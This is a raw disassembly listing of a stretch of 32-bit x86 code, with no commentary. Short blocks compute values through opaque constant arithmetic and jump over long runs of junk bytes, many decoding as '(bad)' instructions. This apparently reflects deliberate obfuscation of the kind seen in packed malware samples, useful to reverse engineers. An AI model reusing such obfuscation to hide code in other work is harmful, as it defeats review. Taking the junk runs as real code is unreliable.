  41f4fc:	xor    esi,DWORD PTR [esi+eax*4+0x47]
  41f500:	jne    0x41f579
  41f502:	inc    ebx
  41f503:	adc    dl,bh
  41f505:	adc    al,0xdf
  41f507:	and    ebx,DWORD PTR fs:[ebp-0x61ea6cab]
  41f50e:	pop    es
  41f50f:	sbb    DWORD PTR [edi-0xcb1ac03],0x82d0637d
  41f519:	ds addr16 and eax,0xfbc26cc
  41f520:	(bad)  
  41f521:	or     BYTE PTR [eax],dh
  41f523:	pop    es
  41f524:	push   ecx
  41f525:	test   BYTE PTR [ebx],dl
  41f527:	sbb    BYTE PTR [ebp-0x7a],al
  41f52a:	retf   0xf51e
  41f52d:	jno    0x41f4b6
  41f52f:	mov    esi,0x8369b9a8
  41f534:	and    DWORD PTR [esi+0x425d4d28],0x509904e7
  41f53e:	mov    WORD PTR [esi+0x4f1046e3],cs
  41f544:	pop    ebx
  41f545:	jns    0x41f568
  41f547:	cli    
  41f548:	call   0xbcc9:0x5822a6b2
  41f54f:	inc    edx
  41f550:	pop    ecx
  41f551:	inc    esp
  41f552:	mov    BYTE PTR [ebp-0x6f],0xef
  41f556:	add    esi,edi
  41f558:	add    al,0x77
  41f55a:	mov    eax,DWORD PTR [esi+edx*2+0x4d]
  41f55e:	push   0xffffffc3
  41f560:	push   0x3e
  41f562:	inc    eax
  41f563:	add    eax,0xf29e0c32
  41f568:	jne    0x41f50b
  41f56a:	xor    al,0x67
  41f56c:	jns    0x41f585
  41f56e:	fnstsw WORD PTR [edi]
  41f570:	(bad)  
  41f571:	cmp    ch,dl
  41f573:	adc    BYTE PTR [edx+0x7c],ah
  41f576:	sbb    dh,BYTE PTR [ebx]
  41f578:	sbb    eax,0x67672b3
  41f57d:	aad    0xb0
  41f57f:	jb     0x41f5d4
  41f581:	(bad)  
  41f582:	retf   
  41f583:	int    0xda
  41f585:	push   ecx
  41f586:	add    BYTE PTR [edx-0x43b499ef],0x4e
  41f58d:	mov    ecx,0xa9adf95b
  41f592:	pop    eax
  41f593:	(bad)  [ebx-0xdb73]
  41f599:	jmp    DWORD PTR [ebx]
  41f59b:	rol    DWORD PTR [ebx],0x45
  41f59e:	mov    esp,0xff208d8b
  41f5a3:	(bad)  
  41f5a4:	dec    DWORD PTR [ebp+0x272f0884]
  41f5aa:	add    BYTE PTR [eax],al
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	pushf  
  41f667:	out    0xfe,eax
  41f669:	fisttp QWORD PTR [ebp+eax*4-0x40]
  41f66d:	mov    esi,0xbebec44a
  41f672:	fimul  WORD PTR [esi-0x3b]
  41f675:	mov    WORD PTR [edi],cs
  41f677:	lods   eax,DWORD PTR ds:[esi]
  41f678:	inc    BYTE PTR [ecx+edi*2-0x7f]
  41f67c:	jnp    0x41f674
  41f67e:	cmp    cl,al
  41f680:	sbb    dh,bh
  41f682:	mov    ebp,DWORD PTR [esi]
  41f684:	inc    eax
  41f685:	bound  ecx,QWORD PTR [eax]
  41f687:	sub    cl,BYTE PTR [eax+ebx*1+0x3181fce8]
  41f68e:	mov    ebp,esi
  41f690:	adc    dl,0xe7
  41f693:	pop    ss
  41f694:	jae    0x41f684
  41f696:	pop    esi
  41f697:	popa   
  41f698:	dec    ebx
  41f699:	(bad)  
  41f69b:	int    0x43
  41f69d:	push   ds
  41f69e:	sbb    BYTE PTR [edx+0x6db1847c],cl
  41f6a4:	sti    
  41f6a5:	mov    dh,0x40
  41f6a7:	xchg   ebp,eax
  41f6a8:	retf   0x3638
  41f6ab:	adc    bl,bl
  41f6ad:	rol    BYTE PTR [eax-0x2da4c07d],1
  41f6b3:	lock inc edx
  41f6b5:	jg     0x41f6a0
  41f6b7:	fsubr  DWORD PTR [edi+0x50]
  41f6ba:	lods   al,BYTE PTR ds:[esi]
  41f6bb:	push   ebx
  41f6bc:	aas    
  41f6bd:	mov    edx,0xcba375d
  41f6c2:	sbb    ah,BYTE PTR [ecx-0x44]
  41f6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c6:	push   0xac41366e
  41f6cb:	pop    ds
  41f6cc:	(bad)  
  41f6cd:	fcomp  QWORD PTR [edx]
  41f6cf:	pop    ds
  41f6d0:	sub    DWORD PTR [esi-0x3ec4433a],esi
  41f6d6:	cwde   
  41f6d7:	push   ss
  41f6d8:	push   edx
  41f6d9:	inc    ebp
  41f6da:	xchg   ebx,eax
  41f6db:	fstp   DWORD PTR [eax+eax*2]
  41f6de:	test   DWORD PTR [ecx+0x73],0x97c313ac
  41f6e5:	pop    edi
  41f6e6:	mov    eax,ds:0xb2478dde
  41f6eb:	mov    ebp,0x788340c0
  41f6f0:	and    al,0x27
  41f6f2:	or     esp,DWORD PTR [ecx+0x8c49fd2]
  41f6f8:	xor    eax,0x14606a5d
  41f6fd:	jmp    0x41f6a8
  41f6ff:	pop    eax
  41f700:	mov    WORD PTR fs:[edi],ss
  41f703:	adc    ecx,DWORD PTR [ecx+edi*4+0x7006c4b4]
  41f70a:	and    DWORD PTR [esi+0x6c],esi
  41f70d:	test   DWORD PTR [esi+0x53],0x2f8f86e4
  41f714:	sahf   
  41f715:	jl     0x41f698
  41f717:	mov    edx,0x15ca2ff
  41f71c:	or     eax,0x3bd12ce2
  41f721:	out    dx,eax
  41f722:	and    BYTE PTR [edx+0x47],cl
  41f725:	cli    
  41f726:	(bad)  
  41f727:	mov    ecx,0x9d43b9de
  41f72c:	shl    BYTE PTR [ebx+0x62],0xf6
  41f730:	fnstcw WORD PTR [ecx-0x4f4e6b0a]
  41f736:	inc    edi
  41f737:	aaa    
  41f738:	mov    al,ds:0xd25258a0
  41f73d:	xchg   ebx,eax
  41f73e:	dec    edi
  41f73f:	(bad)  
  41f740:	es icebp 
  41f742:	jb     0x41f789
  41f744:	outs   dx,BYTE PTR ds:[esi]
  41f745:	ja     0x41f6e2
  41f747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f748:	std    
  41f749:	ror    BYTE PTR [eax+0x26],1
  41f74c:	jecxz  0x41f7a3
  41f74e:	xor    esp,ecx
  41f750:	xor    DWORD PTR [ecx-0x22c24641],edx
  41f756:	popa   
  41f757:	imul   ebp,DWORD PTR [edx+0x73b9f651],0xffffff98
  41f75e:	imul   eax,esi,0x6c
  41f761:	cmc    
  41f762:	shl    DWORD PTR [eax],0xbc
  41f765:	ins    DWORD PTR es:[edi],dx
  41f766:	xor    edi,esi
  41f768:	sti    
  41f769:	push   esi
  41f76a:	mov    ebp,cs
  41f76c:	retf   
  41f76d:	rcr    bl,1
  41f76f:	dec    esp
  41f770:	call   ecx
  41f772:	fiadd  DWORD PTR [ebx-0x50]
  41f775:	cli    
  41f776:	xor    eax,0xbc8e3eaa
  41f77b:	push   esi
  41f77c:	leave  
  41f77d:	ret    0x1675
  41f780:	fld    TBYTE PTR [ebp+0xe5444f0]
  41f786:	add    ebx,DWORD PTR [eax-0x68696182]
  41f78c:	or     eax,DWORD PTR [edi+ecx*1-0x472d08ba]
  41f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f794:	jecxz  0x41f72a
  41f796:	pop    es
  41f797:	sub    eax,0xedc41ecf
  41f79c:	mov    edx,ebx
  41f79e:	or     bh,BYTE PTR [ecx+ebp*4+0x6583b89b]
  41f7a5:	(bad)  
  41f7a6:	(bad)  
  41f7a7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7a9:	mov    esi,DWORD PTR [eax-0x55f3751b]
  41f7af:	jmp    0xf898:0xadb26878
  41f7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7b7:	add    al,0x5f
  41f7b9:	jno    0x41f75c
  41f7bb:	or     dh,BYTE PTR [ecx]
  41f7bd:	jo     0x41f7d6
  41f7bf:	mov    ds:0x34cd5e77,eax
  41f7c4:	gs ins DWORD PTR es:[edi],dx
  41f7c6:	daa    
  41f7c7:	push   edx
  41f7c8:	jno    0x41f756
  41f7ca:	push   ebx
  41f7cb:	fwait
  41f7cc:	(bad)  
  41f7cd:	sbb    al,0xa0
  41f7cf:	test   bl,ah
  41f7d1:	xor    ecx,0x1f
  41f7d4:	push   0x49fff571
  41f7d9:	outs   dx,DWORD PTR ds:[esi]
  41f7da:	cmp    BYTE PTR [edi],al
  41f7dc:	sbb    ebp,DWORD PTR [ebp+0x689caa6a]
  41f7e2:	ins    BYTE PTR es:[edi],dx
  41f7e3:	dec    esp
  41f7e4:	push   edi
  41f7e5:	nop
  41f7e6:	std    
  41f7e7:	mov    al,cs:0x11d579e1
  41f7ed:	mov    dh,0x67
  41f7ef:	and    DWORD PTR [eax],ebp
  41f7f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7f2:	or     BYTE PTR [ebp+ebp*2+0x583074dd],0xb5
  41f7fa:	jno    0x41f7f2
  41f7fc:	shl    BYTE PTR [edi+ebp*4+0x6a],cl
  41f800:	or     eax,0x6c32e9c7
  41f805:	push   edx
  41f806:	mov    ds:0x965e0d7c,al
  41f80b:	(bad)  
  41f80c:	push   eax
  41f80d:	add    edi,DWORD PTR [esi-0x5e]
  41f810:	or     DWORD PTR [ebx+0x37],ebp
  41f813:	dec    ecx
  41f814:	call   0x5c2f:0x2c2c2b5f
  41f81b:	mov    bl,0x13
  41f81d:	mov    dl,0x54
  41f81f:	sub    eax,0x1dcefee5
  41f824:	call   0x4fd15a1a
  41f829:	pop    eax
  41f82a:	aad    0x3e
  41f82c:	lahf   
  41f82d:	adc    eax,0x85edd3e3
  41f832:	cmp    BYTE PTR [esp+ebp*2+0x2ee8fc12],0x28
  41f83a:	xchg   ebp,eax
  41f83b:	inc    edx
  41f83c:	pop    es
  41f83d:	rcl    DWORD PTR [ecx+0xa],1
  41f840:	push   ss
  41f841:	push   ecx
  41f842:	cmp    BYTE PTR [edi-0x59],0x72
  41f846:	inc    ebp
  41f847:	dec    edi
  41f848:	jmp    0x41f87c
  41f84a:	adc    DWORD PTR [esi],ebx
  41f84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f84d:	popf   
  41f84e:	xchg   ebx,eax
  41f84f:	sbb    eax,DWORD PTR [eax]
  41f851:	jl     0x41f8d2
  41f853:	inc    ebx
  41f854:	cmp    eax,0x41b4b084
  41f859:	jno    0x41f8ad
  41f85b:	xchg   ebp,ebx
  41f85d:	sub    eax,0xa0f1780a
  41f862:	xchg   edx,eax
  41f863:	rcr    bl,cl
  41f865:	ins    BYTE PTR es:[edi],dx
  41f866:	add    edi,DWORD PTR gs:[esi+ebx*2-0x5b]
  41f86b:	add    edi,ebp
  41f86d:	mov    dh,0xdd
  41f86f:	and    al,0xed
  41f871:	pop    DWORD PTR [ebp+0x27]
  41f874:	enter  0xef67,0x21
  41f878:	shl    BYTE PTR [ecx-0x17c1c89d],cl
  41f87e:	loopne 0x41f826
  41f880:	and    edi,DWORD PTR [eax+0x22]
  41f883:	in     eax,0x9
  41f885:	mov    edi,0x9bc04c39
  41f88a:	jl     0x41f8c9
  41f88c:	xlat   BYTE PTR ds:[ebx]
  41f88d:	xchg   BYTE PTR [esi],bh
  41f88f:	adc    bh,BYTE PTR [edx+0x35]
  41f892:	push   ebx
  41f893:	out    dx,al
  41f894:	test   bh,ch
  41f896:	pop    ds
  41f897:	cmp    ebx,DWORD PTR [eax+0x5809ddb8]
  41f89d:	xor    BYTE PTR [eax+0x17],cl
  41f8a0:	cli    
  41f8a1:	les    esi,FWORD PTR [esi-0x69]
  41f8a4:	popf   
  41f8a5:	sbb    esp,esp
  41f8a7:	pop    esi
  41f8a8:	das    
  41f8a9:	ds gs sub al,0xec
  41f8ad:	jne    0x41f8e0
  41f8af:	push   edx
  41f8b0:	call   FWORD PTR [edx-0x618454db]
  41f8b6:	shl    bh,1
  41f8b8:	pop    ss
  41f8b9:	dec    esp
  41f8ba:	mov    bl,0x79
  41f8bc:	cmp    ecx,DWORD PTR cs:[eax+0x12]
  41f8c0:	mov    cl,ch
  41f8c2:	stos   BYTE PTR es:[edi],al
  41f8c3:	jns    0x41f90e
  41f8c5:	jbe    0x41f902
  41f8c7:	jns    0x41f882
  41f8c9:	sub    ecx,ebx
  41f8cb:	or     BYTE PTR [edx-0x718da7cc],0xb7
  41f8d2:	scas   al,BYTE PTR es:[edi]
  41f8d3:	xchg   ebx,eax
  41f8d4:	pop    edx
  41f8d5:	lods   eax,DWORD PTR ds:[esi]
  41f8d6:	pop    ss
  41f8d7:	or     BYTE PTR ds:0x6114ddb8,cl
  41f8dd:	cmp    eax,0x45d53a37
  41f8e2:	mov    ebx,0x9ca73b04
  41f8e7:	cdq    
  41f8e8:	push   es
  41f8e9:	loop   0x41f95e
  41f8eb:	fisub  WORD PTR [esi-0x37e759e]
  41f8f1:	aas    
  41f8f2:	(bad)  
  41f8f4:	jbe    0x41f973
  41f8f6:	dec    ebx
  41f8f7:	out    dx,eax
  41f8f8:	push   edi
  41f8f9:	sub    ebx,edx
  41f8fb:	test   DWORD PTR [ecx],edx
  41f8fd:	sbb    eax,0x1daf40bc
  41f902:	mov    WORD PTR [ebp+0x1f],gs
  41f905:	push   0x4f
  41f907:	dec    esi
  41f908:	clc    
  41f909:	scas   al,BYTE PTR es:[edi]
  41f90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90b:	or     DWORD PTR [esi],0x24
  41f90e:	jmp    0x927865d3
  41f913:	into   
  41f914:	cmp    eax,0xe70930e1
  41f919:	scas   al,BYTE PTR es:[edi]
  41f91a:	pop    ss
  41f91b:	clc    
  41f91c:	test   al,0x9d
  41f91e:	ret    
  41f91f:	xor    DWORD PTR [esi+eax*2+0x4b7ea448],ecx
  41f926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f927:	call   0x6151:0xd40a59a
  41f92e:	popf   
  41f92f:	shl    BYTE PTR [eax],1
  41f931:	push   esp
  41f932:	(bad)  
  41f933:	call   0x9fe4:0x817d86c4
  41f93a:	lods   eax,DWORD PTR ds:[esi]
  41f93b:	add    eax,0x65c03307
  41f940:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f942:	inc    esp
  41f943:	mov    ebx,0xe16dd32
  41f948:	mov    bl,0xe2
  41f94a:	push   eax
  41f94b:	leave  
  41f94c:	pop    esp
  41f94d:	sub    esp,DWORD PTR [edx]
  41f94f:	call   DWORD PTR [ebp+ebx*2+0x259cd7b1]
  41f956:	and    eax,0xd3e4b0aa
  41f95b:	lods   al,BYTE PTR ds:[esi]
  41f95c:	cs (bad) 
  41f95e:	xor    BYTE PTR [esi],ah
  41f960:	hlt    
  41f961:	add    ah,ah
  41f963:	mov    cl,0x96
  41f965:	scas   al,BYTE PTR es:[edi]
  41f966:	stc    
  41f967:	repz fwait
  41f969:	shr    al,1
  41f96b:	out    dx,al
  41f96c:	mov    ecx,0x691407b8
  41f971:	mov    cl,0x0
  41f973:	mov    ?,WORD PTR [ebx]
  41f975:	push   es
  41f976:	jecxz  0x41f916
  41f978:	push   es
  41f979:	lods   al,BYTE PTR ds:[esi]
  41f97a:	imul   edx,ecx,0xffffffa0
  41f97d:	adc    dh,dh
  41f97f:	es nop
  41f981:	push   ebx
  41f982:	cmp    ebp,DWORD PTR [edx]
  41f984:	mov    ebp,0x3c26ee2a
  41f989:	xlat   BYTE PTR ds:[ebx]
  41f98a:	add    al,0x84
  41f98c:	loop   0x41f9e7
  41f98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f98f:	add    BYTE PTR [edi],bh
  41f991:	push   edx
  41f992:	in     eax,dx
  41f993:	jmp    0xef31:0xfa439b3f
  41f99a:	mov    es,WORD PTR [eax]
  41f99c:	xor    al,BYTE PTR [edx]
  41f99e:	push   esi
  41f99f:	lea    esp,[eax+0x4213d09c]
  41f9a5:	sub    BYTE PTR [ebx-0x4d],dl
  41f9a8:	mov    ah,0x70
  41f9aa:	aas    
  41f9ab:	dec    esp
  41f9ac:	adc    eax,0xa2136cb5
  41f9b1:	inc    esp
  41f9b2:	not    ebx
  41f9b4:	xor    DWORD PTR [edx-0x43],0x4f
  41f9b8:	es mov cl,0xae
  41f9bb:	push   ebx
  41f9bc:	add    al,0x44
  41f9be:	scas   eax,DWORD PTR es:[edi]
  41f9bf:	mov    edx,DWORD PTR [ecx*2-0x5e5d831c]
  41f9c6:	and    ch,0x5d
  41f9c9:	jnp    0x41f9fb
  41f9cb:	nop
  41f9cc:	inc    ebx
  41f9cd:	retf   
  41f9ce:	fimul  DWORD PTR [ecx]
  41f9d0:	mov    esi,0x27769dbf
  41f9d5:	mov    ch,0x35
  41f9d7:	push   edi
  41f9d8:	inc    ebp
  41f9d9:	jp     0x41f9a1
  41f9db:	mov    ds:0xb32de40,al
  41f9e0:	push   ds
  41f9e1:	cli    
  41f9e2:	dec    edx
  41f9e3:	xchg   ebx,eax
  41f9e4:	or     ebx,DWORD PTR [ecx-0x3560891d]
  41f9ea:	loopne 0x41f9d3
  41f9ec:	sub    bh,BYTE PTR [edx-0x287363f5]
  41f9f2:	mov    edi,0x4a159eb9
  41f9f7:	(bad)  
  41f9f8:	(bad)  
  41f9f9:	fdivr  QWORD PTR [edx-0x72]
  41f9fc:	jmp    0x41f9f4
  41f9fe:	xchg   BYTE PTR [edi+0x1a],bh
  41fa01:	sbb    eax,0xb2f0db28
  41fa06:	push   0xffffffa0
  41fa08:	or     al,0xa0
  41fa0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa0b:	popa   
  41fa0c:	push   ebx
  41fa0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa0e:	ret    0x91af
  41fa11:	scas   al,BYTE PTR es:[edi]
  41fa12:	into   
  41fa13:	je     0x41f9f1
  41fa15:	arpl   WORD PTR [edx+0x6],si
  41fa18:	int    0x78
  41fa1a:	mov    ecx,0x7c427a4c
  41fa1f:	xlat   BYTE PTR ds:[ebx]
  41fa20:	jmp    0xa1af:0xb0a69ae2
  41fa27:	jo     0x41f9e0
  41fa29:	dec    edx
  41fa2a:	mov    ebp,0x57d768c4
  41fa2f:	push   esi
  41fa30:	mov    al,0xb4
  41fa32:	cmp    dh,BYTE PTR [ecx-0x4e]
  41fa35:	ss pop eax
  41fa37:	and    al,0xcd
  41fa39:	jbe    0x41faac
  41fa3b:	xchg   DWORD PTR [ebx-0x35cc1fab],ecx
  41fa41:	mov    edx,DWORD PTR [ebp-0x10c]
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	cdq    
  41fb63:	push   ds
  41fb64:	push   cs
  41fb65:	sahf   
  41fb66:	xlat   BYTE PTR ds:[ebx]
  41fb67:	(bad)  
  41fb68:	sar    BYTE PTR [esi-0x41413bb6],0xe8
  41fb6f:	jns    0x41fb77
  41fb71:	mov    edi,DWORD PTR [ecx]
  41fb73:	sub    ebp,DWORD PTR [edi]
  41fb75:	shl    BYTE PTR [esi+0x5d],1
  41fb78:	sub    bh,BYTE PTR [edi+esi*8]
  41fb7b:	pop    eax
  41fb7c:	in     eax,dx
  41fb7d:	arpl   WORD PTR [ebx],bx
  41fb7f:	(bad)  
  41fb80:	pop    ds
  41fb81:	aad    0x2e
  41fb83:	jmp    0x376d:0x9e229521
  41fb8a:	sbb    DWORD PTR [edx+eiz*4+0x3],eax
  41fb8e:	test   eax,0x9121e009
  41fb93:	arpl   WORD PTR [ebx-0x7d647fd9],bp
  41fb99:	sub    DWORD PTR [ebp-0x77855af7],esp
  41fb9f:	outs   dx,BYTE PTR ds:[esi]
  41fba0:	and    ch,ch
  41fba2:	icebp  
  41fba3:	test   al,0xf7
  41fba5:	out    dx,al
  41fba6:	out    0x22,al
  41fba8:	rcr    BYTE PTR [ebx+0x28],cl
  41fbab:	add    al,0x9f
  41fbad:	or     al,0x96
  41fbaf:	stos   DWORD PTR es:[edi],eax
  41fbb0:	lods   eax,DWORD PTR ds:[esi]
  41fbb1:	xchg   BYTE PTR [eax],cl
  41fbb3:	sbb    DWORD PTR [edx+0x158e38fb],0xffffffe5
  41fbba:	mov    ah,0x79
  41fbbc:	mov    esi,0xbbcc54cd
  41fbc1:	xor    ch,BYTE PTR [edi-0x1a]
  41fbc4:	sbb    eax,0x8e2ae888
  41fbc9:	or     eax,0x20d55b6
  41fbce:	cmp    eax,0x602f0f34
  41fbd3:	(bad)
  41fbd7:	mov    eax,ds:0xc5f1b002
  41fbdc:	pushf  
  41fbdd:	sbb    cl,BYTE PTR ds:0xee31c1ac
  41fbe3:	sub    al,0x56
  41fbe5:	jmp    0xaed5:0x49702fb1
  41fbec:	ror    esp,0x89
  41fbef:	add    ebp,eax
  41fbf1:	ins    DWORD PTR es:[edi],dx
  41fbf2:	add    eax,0xeefb66a2
  41fbf7:	retf   
  41fbf8:	in     al,dx
  41fbf9:	push   edx
  41fbfa:	(bad)  
  41fbfb:	bound  ecx,QWORD PTR [ebp+0x1c59de95]
  41fc01:	rcr    dh,cl
  41fc03:	rol    BYTE PTR [ecx],cl
  41fc05:	xchg   ebp,eax
  41fc06:	addr16 jg 0x41fbb6
  41fc09:	(bad)
  41fc0c:	jo     0x41fc37
  41fc0e:	dec    esi
  41fc0f:	adc    al,0xb8
  41fc11:	adc    BYTE PTR [ecx],dh
  41fc13:	dec    edi
  41fc14:	stos   DWORD PTR es:[edi],eax
  41fc15:	sahf   
  41fc16:	cmp    ebp,ebx
  41fc18:	enter  0xa5d5,0xf
  41fc1c:	cmp    esp,DWORD PTR [ebp+0x2f726b2e]
  41fc22:	jle    0x41fc4d
  41fc24:	push   cs
  41fc25:	arpl   bp,bp
  41fc27:	sbb    ch,BYTE PTR [ebx-0x267866a7]
  41fc2d:	ds inc eax
  41fc2f:	and    ecx,DWORD PTR [edi]
  41fc31:	outs   dx,DWORD PTR ds:[esi]
  41fc32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc33:	and    al,0x49
  41fc35:	lock and eax,0x379096d3
  41fc3b:	jne    0x41fca6
  41fc3d:	add    eax,0xe2c7a448
  41fc42:	xor    ebx,ebp
  41fc44:	cmp    esp,DWORD PTR [eax+0x42c04851]
  41fc4a:	gs lahf 
  41fc4c:	je     0x41fc8d
  41fc4e:	mov    ah,0x32
  41fc50:	jnp    0x41fc10
  41fc52:	and    al,0x1e
  41fc54:	pop    ebx
  41fc55:	xchg   esi,eax
  41fc56:	pop    ecx
  41fc57:	das    
  41fc58:	xchg   ecx,edx
  41fc5a:	lds    edx,FWORD PTR [ecx+0x6a]
  41fc5d:	push   es
  41fc5e:	pop    ds
  41fc5f:	scas   al,BYTE PTR es:[edi]
  41fc60:	or     bl,BYTE PTR [edi+esi*2-0x62]
  41fc64:	leave  
  41fc65:	sub    eax,0xc8d471f
  41fc6a:	mov    ebx,DWORD PTR [edi-0x76]
  41fc6d:	sub    eax,0xa47318d5
  41fc72:	xor    eax,0xaf16271
  41fc77:	cld    
  41fc78:	mov    eax,0xbe78d3cf
  41fc7d:	popf   
  41fc7e:	(bad)  
  41fc7f:	shr    DWORD PTR [ebx-0xa],1
  41fc82:	bound  ebp,QWORD PTR [edx+0x60]
  41fc85:	mov    ds:0x18e2a6d,eax
  41fc8a:	(bad)  
  41fc8b:	shl    DWORD PTR [esi+edi*2-0x80],1
  41fc8f:	and    dl,BYTE PTR [ebx]
  41fc91:	mov    cl,0x64
  41fc93:	and    eax,0x86f20b
  41fc98:	fcmovnb st,st(1)
  41fc9a:	lock jecxz 0x41fcfb
  41fc9d:	push   0xffffffaa
  41fc9f:	adc    cl,BYTE PTR [edi]
  41fca1:	dec    bp
  41fca3:	and    DWORD PTR [ebp+eax*8+0xc],esi
  41fca7:	pop    edx
  41fca8:	xor    dl,BYTE PTR [edi-0x5e]
  41fcab:	adc    eax,0xa311d859
  41fcb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcb1:	sti    
  41fcb2:	adc    eax,0xc5e6916d
  41fcb7:	push   eax
  41fcb8:	sub    DWORD PTR [edx],edi
  41fcba:	push   esi
  41fcbb:	fucom  st(7)
  41fcbd:	adc    ch,BYTE PTR [edi]
  41fcbf:	aam    0xf2
  41fcc1:	fwait
  41fcc2:	add    eax,0x49bb18ce
  41fcc7:	add    ah,0xd2
  41fcca:	and    al,0x0
  41fccc:	outs   dx,BYTE PTR ds:[esi]
  41fccd:	or     BYTE PTR ds:0x23c2a786,dh
  41fcd3:	add    BYTE PTR [edi],dh
  41fcd5:	mov    DWORD PTR [esi-0x21],ebx
  41fcd8:	mov    edi,0x3df03511
  41fcdd:	push   0x7b7a5461
  41fce2:	mov    ?,WORD PTR [eax+0x7f]
  41fce5:	fstp   DWORD PTR [ebx-0x3050a2ae]
  41fceb:	dec    esi
  41fcec:	lods   al,BYTE PTR ds:[esi]
  41fced:	nop
  41fcee:	les    ebx,FWORD PTR [ebp+0x7838ff18]
  41fcf4:	dec    edi
  41fcf5:	(bad)  
  41fcf6:	stc    
  41fcf7:	je     0x41fcf1
  41fcf9:	xchg   edi,eax
  41fcfa:	xor    DWORD PTR [ebx-0x2dcf74ed],0x65
  41fd01:	dec    edx
  41fd02:	mov    edx,esp
  41fd04:	outs   dx,BYTE PTR ds:[esi]
  41fd05:	div    BYTE PTR ds:0xc38b349d
